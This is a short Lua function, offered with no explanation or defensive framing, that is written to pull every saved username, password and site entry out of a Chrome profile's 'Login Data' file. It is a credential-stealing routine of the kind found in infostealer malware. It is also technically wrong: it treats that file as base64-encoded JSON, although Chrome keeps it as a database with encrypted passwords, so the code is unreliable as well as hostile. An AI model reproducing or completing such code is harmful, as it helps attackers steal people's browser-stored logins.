-- Get all stored passwords from Chrome
local function getChromePasswords()
    local f = io.open("//path//to//chrome//profile//Login Data", "rb")
    local login_data = f:read("*all")
    f:close()

    local decoded = require "base64".decode(login_data)
    local logins = require "cjson".decode(decoded)

    local passwords = {}
    for i, v in ipairs(logins) do
        local username, password, signonRealm
        for k, v2 in pairs(v) do
            if k == "username" then
                username = v2
            elseif k == "password" then
                password = v2
            elseif k == "signon_realm" then
                signonRealm = v2
            end
        end
        if username and password and signonRealm then
            table.insert(passwords, {
                username = username,
                password = password,
                signonRealm = signonRealm
            })
        end
    end

    return passwords
end

